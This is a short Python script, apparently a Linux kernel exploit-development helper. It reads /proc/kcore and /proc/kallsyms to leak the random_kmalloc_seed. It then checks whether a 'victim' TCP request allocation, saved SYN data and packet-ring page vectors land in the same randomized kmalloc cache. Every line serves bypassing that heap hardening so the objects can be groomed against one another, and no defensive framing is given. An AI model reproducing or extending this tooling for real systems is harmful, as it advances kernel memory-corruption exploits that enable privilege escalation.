#!/usr/bin/env python3
"""tri_match.py - victim / saved_syn / alloc_pg_vec random-kmalloc buckets."""
import struct
def rd(va,n):
    f=open('/proc/kcore','rb'); h=f.read(64)
    off=struct.unpack_from('<Q',h,0x20)[0]; es=struct.unpack_from('<H',h,0x36)[0]; en=struct.unpack_from('<H',h,0x38)[0]; f.seek(off)
    for _ in range(en):
        ph=f.read(es); t=struct.unpack_from('<I',ph,0)[0]; po,pv,pp,pf=struct.unpack_from('<QQQQ',ph,8)
        if t==1 and pv<=va<pv+pf: f.seek(po+va-pv); return f.read(n)
s={}
for line in open('/proc/kallsyms'):
    p=line.split()
    if len(p)>=3:
        try: s[p[2]]=int(p[0],16)
        except: pass
seed=struct.unpack('<Q',rd(s['random_kmalloc_seed'],8))[0]
G=0x61C8864680B583EB; M=(1<<64)-1
def idx(c): return (((c^seed)&M)*G & M)>>60
v=idx(s['tcp_v4_route_req']+0x91)
sv=idx(s['tcp_reqsk_record_syn']+0x77)
pgname='alloc_pg_vec.isra.0' if 'alloc_pg_vec.isra.0' in s else 'alloc_pg_vec'
pg=idx(s[pgname]+0x2c) if pgname in s else -1
print("seed=%#x victim=%d saved=%d pgvec=%d %s"%(seed,v,sv,pg,"TRIMATCH" if v==sv==pg else "nomatch"))
